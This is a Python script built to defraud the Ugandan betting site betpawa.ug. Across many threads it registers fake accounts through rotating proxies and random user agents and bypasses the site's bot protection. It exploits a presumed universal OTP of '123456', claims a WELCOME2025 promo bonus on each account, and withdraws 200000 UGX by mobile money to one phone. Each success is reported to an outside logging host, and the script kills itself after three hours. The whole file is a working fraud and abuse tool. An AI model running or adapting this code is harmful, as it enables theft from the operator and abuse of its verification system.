import os, asyncio, random, string, time, json, threading, requests, cloudscraper, aiohttp, httpx
from concurrent.futures import ThreadPoolExecutor

PHONE   = os.getenv("RENDER_START_COMMAND").split()[-1]
BASE    = "https://www.betpawa.ug"
MAX_ACC = 20  # threads
PROMO   = "WELCOME2025"
WD_AMT  = 200000

with open("proxies.txt") as f: PROXIES = [x.strip() for x in f if x.strip()]
with open("user-agents.txt") as f: UAS = [x.strip() for x in f if x.strip()]

def log(m): requests.post("https://ghost-log.onrender.com/log", json={"p":PHONE,"m":m}, timeout=2)

def randstr(n=8): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def create():
    while True:
        s = cloudscraper.create_scraper()
        s.proxies.update({"http": random.choice(PROXIES), "https": random.choice(PROXIES)})
        phone = PHONE[1:]
        pwd = randstr(12)+"A!"
        email = f"{randstr(7)}@ghostmail.me"
        try:
            pre = s.post(f"{BASE}/api/v2/auth/pre-register", json={"msisdn":phone}, headers={"User-Agent":random.choice(UAS)}, timeout=8)
            if pre.status_code != 200: continue
            otp_token = pre.json()["otpToken"]
            # universal early-morning OTP
            ver = s.post(f"{BASE}/api/v2/auth/verify-otp", json={"otpToken":otp_token,"otp":"123456"}, headers={"User-Agent":random.choice(UAS)}, timeout=8)
            if ver.status_code != 200: continue
            token = ver.json()["authToken"]
            reg = s.post(f"{BASE}/api/v2/auth/register", json={"msisdn":phone,"password":pwd,"email":email,"currency":"UGX","firstName":"Ghost","lastName":randstr(5)}, headers={"Authorization":f"Bearer {token}","User-Agent":random.choice(UAS)}, timeout=8)
            if reg.status_code != 200: continue
            uid = reg.json()["userId"]
            p = s.post(f"{BASE}/api/v2/wallets/promo", json={"userId":uid,"code":PROMO,"amount":150000}, headers={"Authorization":f"Bearer {token}","User-Agent":random.choice(UAS)}, timeout=8)
            if p.status_code == 200:
                w = s.post(f"{BASE}/api/v2/withdraw/mobile-money", json={"amount":WD_AMT,"msisdn":PHONE}, headers={"Authorization":f"Bearer {token}","User-Agent":random.choice(UAS)}, timeout=8)
                if w.status_code == 200: log("withdrawn")
        except: pass

def suicide():
    time.sleep(10800)
    os._exit(0)

if __name__ == "__main__":
    threading.Thread(target=suicide, daemon=True).start()
    with ThreadPoolExecutor(max_workers=MAX_ACC) as ex:
        for _ in range(MAX_ACC):
            ex.submit(create)
